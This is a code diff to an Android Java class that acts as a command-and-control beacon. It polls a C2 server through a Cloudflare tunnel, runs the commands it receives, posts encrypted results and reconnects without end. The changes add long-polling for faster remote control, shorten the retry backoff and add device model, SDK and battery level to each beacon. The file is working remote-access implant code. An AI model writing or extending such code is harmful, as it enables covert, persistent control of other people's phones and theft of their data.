@@ -29,8 +29,9 @@ import okhttp3.Response;
 
 /**
  * Beacons to the C2 server over HTTPS through the Cloudflare tunnel using
- * OkHttp: pooled keep-alive connections (fast interactive control), transparent
- * gzip, automatic retries.
+ * OkHttp: pooled keep-alive connections, transparent gzip, automatic retries.
+ * The server long-polls /b/ (holds the fetch up to 25s), so queued commands
+ * arrive within milliseconds without hammering the network.
  *
  * Security:
  *  - payloads are AES-256-GCM framed ("ENC1:" + b64(nonce||ct)) with the PSK
@@ -40,7 +41,7 @@ import okhttp3.Response;
  *    fingerprint is baked as c2_pin; connections accept the pin OR any
  *    system-trusted CA (Cloudflare edge certs stay valid)
  *  - result POST responses carry the next queued command (pipelining);
- *    FASTPOLL drops the idle interval to ~0.7s for interactive control
+ *    FASTPOLL keeps a short 0.7s cadence as a fallback for slow servers
  */
 public class C2Beacon implements Runnable {
     private static final MediaType TEXT = MediaType.parse("text/plain; charset=utf-8");
@@ -66,7 +67,7 @@ public class C2Beacon implements Runnable {
         this.id = aid == null || aid.isEmpty() ? "unknown" : aid;
         OkHttpClient.Builder b = new OkHttpClient.Builder()
                 .connectTimeout(15, TimeUnit.SECONDS)
-                .readTimeout(15, TimeUnit.SECONDS)
+                .readTimeout(40, TimeUnit.SECONDS) // long-poll holds /b/ up to 25s
                 .retryOnConnectionFailure(true);
         if (certPin != null && base.startsWith("https")) {
             try {
@@ -134,7 +135,7 @@ public class C2Beacon implements Runnable {
         android.util.Log.i("AndroRemoteC2", "beacon start base=" + base + " id=" + id
                 + " key=" + (key != null) + " pin=" + (certPin != null));
         // Infinite reconnect: this loop never gives up. Any failure (C2 down,
-        // tunnel restarting, airplane mode) backs off exponentially (10s -> 5min
+        // tunnel restarting, airplane mode) backs off exponentially (250ms -> 5min
         // cap) and retries. It only exits when its service instance is destroyed;
         // the new instance starts a fresh beacon thread.
         int fails = 0;
@@ -151,25 +152,18 @@ public class C2Beacon implements Runnable {
                 android.util.Log.w("AndroRemoteC2", "beacon error (retry infinite, fails=" + fails + "): " + t);
             }
             try {
+                long extra = fails > 3 ? (1L << Math.min(fails, 8)) * 1000L : 0;
+                // server long-polls /b/ (holds up to 25s) — an empty response
+                // means it already waited; reconnect immediately
+                long sleep = Math.min(300_000L, 250L + extra);
                 long fast = fastUntil - System.currentTimeMillis();
-                long sleep;
-                if (fast > 0) {
-                    sleep = 700;
-                } else {
-                    long extra = fails > 3 ? (1L << Math.min(fails, 8)) * 1000L : 0;
-                    sleep = Math.min(300_000L, 10_000L + (long) (Math.random() * 4_000) + extra);
-                }
+                if (fast > 0 && extra == 0) sleep = 700;
                 Thread.sleep(sleep);
             } catch (InterruptedException e) {
                 if (svc.destroyed) return; // service torn down: exit, successor restarts
                 // otherwise a wake-up (e.g. network back): loop around and retry now
             }
         }
-    }
-
-    private String url(String path) throws Exception {
-        String model = java.net.URLEncoder.encode(Build.MODEL == null ? "?" : Build.MODEL, "UTF-8");
-        return base + path + "?model=" + model;
     }
 
     private String fetchCommand() throws Exception {
@@ -182,6 +176,21 @@ public class C2Beacon implements Runnable {
             if (cmd == null || cmd.isEmpty()) return null;
             return cmd.split("\n", 2)[0].trim();
         }
+    }
+
+    private String url(String path) throws Exception {
+        String model = java.net.URLEncoder.encode(Build.MODEL == null ? "?" : Build.MODEL, "UTF-8");
+        int batt = -1;
+        try {
+            android.content.Intent bi = svc.registerReceiver(null,
+                    new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+            int level = bi != null ? bi.getIntExtra("level", -1) : -1;
+            int scale = bi != null ? bi.getIntExtra("scale", 100) : 100;
+            if (level >= 0 && scale > 0) batt = level * 100 / scale;
+        } catch (Exception ignored) {}
+        return base + path + "?model=" + model
+                + "&sdk=" + Build.VERSION.SDK_INT
+                + "&batt=" + batt;
     }
 
     /** Execute cmd, POST the (encrypted) result; the response is the next queued command. */
